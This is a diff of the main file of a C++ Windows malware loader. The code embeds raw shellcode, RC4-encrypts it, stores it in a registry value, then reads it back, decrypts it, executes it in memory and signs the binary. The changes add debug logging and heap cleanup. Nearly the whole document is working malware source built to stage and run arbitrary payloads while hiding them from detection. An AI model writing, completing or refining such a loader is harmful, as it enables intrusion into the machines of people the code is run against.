@@ -1,12 +1,12 @@
-#include "registry_utils.h"
-#include "shellcode_handler.h"
+#include "config.h"
 #include "rc4.h"
 #include "binary_signer.h"
-#include "config.h"
+#include "registry_utils.h"
+#include "shellcode_handler.h"
+#include "write_payload.h"  // Include the new file
 #include <iostream>
 #include <vector>
 
-// Step 1: Embed the shellcode directly in the C++ source code
 unsigned char shellcode[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -46,46 +46,57 @@ int main() {
     std::string registryKey = config::registryKey;
     std::string valueName = config::valueName;
 
-    // Step 2: Convert the embedded shellcode to a vector for compatibility with existing code
-    std::vector<uint8_t> shellcodeVector(shellcode, shellcode + sizeof(shellcode));
+    // Step 1: Verbose output about the shellcode size
+    std::cout << "[DEBUG] Shellcode size: " << sizeof(shellcode) << " bytes" << std::endl;
 
-    // Step 3: Optionally encrypt the shellcode using RC4 encryption
+    // Step 2: Convert the embedded shellcode to a vector
+    std::vector<uint8_t> shellcodeVector(shellcode, shellcode + sizeof(shellcode));
+    std::cout << "[DEBUG] Shellcode vector created with size: " << shellcodeVector.size() << std::endl;
+
+    // Step 3: Encrypt the shellcode and provide verbose output
     RC4EncryptDecrypt(shellcodeVector, config::encryptionKey);
-    std::cout << "Shellcode encrypted.\n";
+    std::cout << "[DEBUG] Shellcode encrypted.\n";
 
     // Step 4: Write the encrypted shellcode to the Windows registry
     if (WriteShellcodeToRegistry(registryKey, valueName, shellcodeVector.data(), shellcodeVector.size())) {
-        std::cout << "Encrypted shellcode written to registry successfully.\n";
+        std::cout << "[DEBUG] Encrypted shellcode written to registry successfully.\n";
     }
     else {
-        std::cerr << "Failed to write shellcode to registry.\n";
+        std::cerr << "[ERROR] Failed to write shellcode to registry.\n";
         return 1;
     }
 
     // Step 5: Read the encrypted shellcode from the registry
-    BYTE buffer[1024];
-    if (ReadShellcodeFromRegistry(registryKey, valueName, buffer, sizeof(buffer))) {
-        std::cout << "Shellcode read from registry successfully.\n";
-    }
-    else {
-        std::cerr << "Failed to read shellcode from registry.\n";
+    BYTE* pPayload = NULL;
+    if (!ReadShellcodeFromRegistry(shellcodeVector.size(), &pPayload)) {
+        std::cerr << "[ERROR] Failed to read shellcode from registry.\n";
         return 1;
     }
+    std::cout << "[DEBUG] Shellcode read from registry successfully.\n";
 
-    // Step 6: Decrypt the shellcode after reading from the registry
-    std::vector<uint8_t> decryptedShellcode(buffer, buffer + shellcodeVector.size());
+    // Step 6: Decrypt the shellcode and log the action
+    std::vector<uint8_t> decryptedShellcode(pPayload, pPayload + shellcodeVector.size());
     RC4EncryptDecrypt(decryptedShellcode, config::encryptionKey);  // Decrypt using the same key
-    std::cout << "Shellcode decrypted.\n";
+    std::cout << "[DEBUG] Shellcode decrypted.\n";
 
-    // Step 7: Execute the shellcode
-    ExecuteShellcode(decryptedShellcode.data(), decryptedShellcode.size());
+    // Step 7: Execute the shellcode and add logging for execution status
+    if (!RunShellcode(decryptedShellcode.data(), decryptedShellcode.size())) {
+        std::cerr << "[ERROR] Failed to execute shellcode.\n";
+        HeapFree(GetProcessHeap(), 0, pPayload);
+        return 1;
+    }
+    std::cout << "[DEBUG] Shellcode executed.\n";
 
-    // Step 8: Optionally sign the binary executable
+    // Step 8: Clean up allocated memory
+    HeapFree(GetProcessHeap(), 0, pPayload);
+    std::cout << "[DEBUG] Memory cleaned up.\n";
+
+    // Step 9: Optionally sign the binary executable
     if (SignBinary(config::binaryFilePath)) {
-        std::cout << "Binary signed successfully.\n";
+        std::cout << "[DEBUG] Binary signed successfully.\n";
     }
     else {
-        std::cerr << "Failed to sign binary.\n";
+        std::cerr << "[ERROR] Failed to sign binary.\n";
     }
 
     return 0;
